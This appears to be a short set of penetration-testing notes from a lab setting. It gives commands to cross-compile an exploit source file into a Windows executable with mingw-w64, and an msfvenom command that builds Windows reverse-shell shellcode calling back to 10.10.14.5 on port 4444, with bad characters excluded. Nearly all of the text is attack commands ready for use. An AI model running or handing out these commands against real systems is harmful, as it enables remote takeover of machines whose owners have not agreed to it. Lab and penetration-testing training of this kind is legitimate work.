# Cross compiling from kali to exe for windows

```bash
sudo apt install mingw-w64

i686-w64-mingw32-gcc 42341.c -o exploit.exe

i686-w64-mingw32-gcc 42341.c -o exploit.exe -lws2_32
```

------------------

# MSF Venom shellcode
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```
